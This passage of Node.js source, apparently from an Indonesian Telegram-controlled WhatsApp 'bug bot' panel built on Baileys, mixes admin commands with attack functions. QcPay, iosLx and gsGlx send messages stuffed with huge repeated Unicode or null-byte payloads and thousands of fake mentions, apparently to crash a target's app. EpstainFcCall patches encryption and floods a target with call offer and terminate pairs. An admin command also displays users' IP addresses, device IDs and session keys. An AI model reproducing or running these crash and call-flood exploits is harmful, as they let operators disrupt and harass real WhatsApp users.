    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;

    // === Buat tampilan stats ===
    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• VIP: ${vips}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    // Hitung berapa kali setiap user membuat akun
    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    // Gabungkan data username, role, dan total akun dibuat
    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    // Urutkan dari yang paling banyak membuat akun
    list.sort((a, b) => b.total - a.total);

    // Format teks file
    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath); // hapus file setelah dikirim
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

const SESSION_PATH = path.join(__dirname, "permenmd");

// === Fitur /clearsession ===
bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    // Hapus seluruh isi folder permenmd
    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true }); // buat ulang folder kosong

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *permenmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'permenmd' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      // Cek apakah folder berisi file .json
      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const coins = dbUser?.coins !== undefined ? dbUser.coins : 100;
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Coin:* 💰 ${coins}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

// ===== FUNGSI KIRIM NOTIFIKASI DEVICE CONFLICT =====
async function sendDeviceConflictNotification(username, oldDevice, newDevice, ipAddress) {
  const message = `
🚨 *DEVICE CONFLICT DETECTED!*

👤 *Username:* ${username}
📱 *Old Device:* ${oldDevice.model || 'Unknown'} (${oldDevice.androidId})
🆕 *New Device Trying:* ${newDevice.model || 'Unknown'} (${newDevice.androidId})
📍 *IP Address:* ${ipAddress}
⏰ *Time:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}

⚠️ Previous device will be logged out!
  `.trim();

  sendToGroupsUtama(message, { parse_mode: "Markdown" });
}

// ===== FUNGSI GET DEVICE INFO =====
async function getDeviceInfo(androidId, deviceName = "Unknown") {
  return {
    androidId,
    model: deviceName,
    loginTime: new Date().toISOString()
  };
}

bot.onText(/\/connect(?:\s+(\S+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const number = match[1];

  // Kirim pesan awal (nanti kita EDIT)
  let statusMsg = await bot.sendMessage(chatId, "⏳ Memproses perintah...");

  // Validasi input
  if (!number) {
    return bot.editMessageText(
      "⚠️ *Usage:* /connect <nomor>\nContoh: `/connect 628123456789`",
      {
        chat_id: chatId,
        message_id: statusMsg.message_id,
        parse_mode: "Markdown"
      }
    );
  }

  if (!/^\d{7,}$/.test(number)) {
    return bot.editMessageText(
      "❌ Nomor tidak valid!\nGunakan format angka saja, contoh: `628123456789`",
      {
        chat_id: chatId,
        message_id: statusMsg.message_id,
        parse_mode: "Markdown"
      }
    );
  }

  // Update status
  await bot.editMessageText(
    `🔄 Memulai pairing untuk *${number}*...`,
    {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      parse_mode: "Markdown"
    }
  );

  try {
    // Progress animasi
    const frames = ["🔄", "⏳", "🌀", "🔁"];
    let i = 0;

    // Interval progress
    const interval = setInterval(() => {
      bot.editMessageText(
        `${frames[i++ % frames.length]} Pairing *${number}* sedang berjalan...`,
        {
          chat_id: chatId,
          message_id: statusMsg.message_id,
          parse_mode: "Markdown"
        }
      ).catch(() => {});
    }, 800);

    // Jalankan pairing
    await pairingkids(bot, chatId, number);

    clearInterval(interval);

    await bot.editMessageText(
      `✅ Pairing untuk *${number}* selesai!\nCek WhatsApp kamu untuk kode pairing.`,
      {
        chat_id: chatId,
        message_id: statusMsg.message_id,
        parse_mode: "Markdown"
      }
    );
  } catch (err) {
    console.error(err);

    await bot.editMessageText(
      "❌ Terjadi kesalahan saat pairing.\nCoba lagi nanti.",
      {
        chat_id: chatId,
        message_id: statusMsg.message_id,
        parse_mode: "Markdown"
      }
    );
  }
});

// ===== FITUR RESTART MANUAL (SAMA GAYA DENGAN AUTO RESTART) =====
bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  sendToGroupsUtama("🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...", { parse_mode: "Markdown" });
  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
    sendToGroupsUtama("🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!", { parse_mode: "Markdown" });
  }, 8000); // kirim pesan sukses setelah 8 detik

  // Tunggu 5 detik lalu restart
  setTimeout(() => {
    process.exit(0);
  }, 5000);
});
// ===== Start Express Server =====
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
    startUserSessions()
});

// ===== AUTO RESTART PANEL DENGAN STATUS TELEGRAM =====
const RESTART_INTERVAL = 20 * 60 * 1000; // 20 menit

function kirimStatusServer(pesan) {
  try {
    sendToGroupsUtama(`🟣 *Status Panel:*\n${pesan}`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}

// Kirim notifikasi saat server aktif
kirimStatusServer("✅ Server aktif dan berjalan normal.");

// Kirim notifikasi sebelum restart
setInterval(() => {
  kirimStatusServer("♻️ Panel akan *restart otomatis* untuk menjaga kestabilan...");
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0); // memicu restart otomatis di panel
  }, 5000); // beri jeda 5 detik agar pesan terkirim dulu
}, RESTART_INTERVAL);

async function QcPay(sock, target, zid = true) {
  const payload = "꧀".repeat(10000)
  const miaw = await generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      body: {
        text: payload
      },
      nativeFlowMessage: {
        messageVersion: 3,
        buttons: [
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: payload,
              id: `detail`
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: payload,
              id: `ssss`
            })
          }

        ]
      },
      contextInfo: {
        conversionDelaySeconds: 9999,
        forwardingScore: 999999,
        isForwarded: true,
        participant: "0@s.whatsapp.net",
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: payload,
          contentType: 3,
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: 999e+21 * 999e+21
          }
        },
        remoteJid: "@s.whatsapp.net"
      }
    }
  }), {});

  await sock.relayMessage(target, miaw.message, zid ? { messageId: miaw.key.id, participant: { jid: target } } : { messageId: miaw.key.id });
  await sleep(10000);
}

async function permenCall(sock, toJid, isVideo = true) {
  try {
    const callId = crypto.randomBytes(16).toString('hex').toUpperCase().substring(0, 64);

    const callLayout = []
    const offerContent = [
      { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
      isVideo ? {
        tag: 'video',
        attrs: {
          enc: 'vp8',
          dec: 'vp8',
          orientation: '0',
          screen_width: '1920',
          screen_height: '1080',
          device_orientation: '0'
        }
      } : null,
      { tag: 'net', attrs: { medium: '3' } },
      { tag: 'capability', attrs: { ver: '1' }, content: Buffer.from([0x00, 0x00, 0x00, 0x00]) },
      { tag: 'encopt', attrs: { keygen: '2' } }
    ].filter(Boolean);

    callLayout.push({ tag: 'title', attrs: { ver: '1' }, content: 'PermenMD' })
    const encKey = crypto.randomBytes(32);
    const devices = (await sock.getUSyncDevices([toJid], true, false))
      .map(({ user, device }) => jidEncode(user, 's.whatsapp.net', device));

    await sock.assertSessions(devices, true);

    const { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, {
      call: { callKey: new Uint8Array(encKey) }
    }, { count: '2' });

    offerContent.push({ tag: 'destination', attrs: {}, content: destinations });

    if (shouldIncludeDeviceIdentity) {
      const { encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys/lib/Utils');
      offerContent.push({
        tag: 'device-identity',
        attrs: {},
        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
      });
    }

    const stanza = {
      tag: 'call',
      attrs: {
        id: sock.generateMessageTag(),
        to: toJid
      },
      content: [{
        tag: 'offer',
        attrs: {
          'call-id': callId,
          'call-creator': sock.user.id
        },
        content: offerContent
      }]
    };

    await sock.query(stanza).catch(err => console.error("❌ Error sending call:", err));
    return { id: callId, to: toJid };
  } catch (error) {
    console.error("Error in permenCall:", error);
    return null;
  }
}

async function iosLx(sock, target) {
  for ( let z = 0; z < 2; z++ ) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/forno",
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: null, 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              }
            }
          }
        }
      }
    },{ participant: { jid:target } });
  }
}

async function EpstainFcCall(sock, target) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");
    const crypto = require("crypto");
    const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
    await sock.assertSessions(devices);
    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;
        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = bokep(
                    yntkts ? yntkts(msg) : encodeWAMessage(msg)
                );
                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });
                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );
        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        const callId = crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase();
        let {
            nodes: destinations,
            shouldIncludeDeviceIdentity
        } = await sock.createParticipantNodes(
            devices,
            { conversation: "y" },
            { count: "0" }
        );
        const callOffer = {
            tag: "call",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": callId,
                    "call-creator": sock.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }] : [])
                ]
            }]
        };
        
        await sock.sendNode(callOffer);
        await sleep(1000);
        const callTerminate = {
            tag: "call",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "terminate",
                attrs: {
                    "call-id": callId,
                    "reason": "REJECTED",
                    "call-creator": sock.user.id
                },
                content: []
            }]
        };
        
        await sock.sendNode(callTerminate);
        await sleep(1000);
    }
    console.log("Done");
}

async function gsGlx(sock, target, zid = true) {
  for(let z = 0; z < 10; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "7eppeli - Expos3d",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
}

// Add proper exit handling
process.on('SIGINT', () => {
  console.log('Received SIGINT, shutting down gracefully...');
  if (keyListWatcher) {
    fs.unwatchFile("keyList.json");
  }
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('Received SIGTERM, shutting down gracefully...');
  if (keyListWatcher) {
    fs.unwatchFile("keyList.json");
  }
  process.exit(0);
});
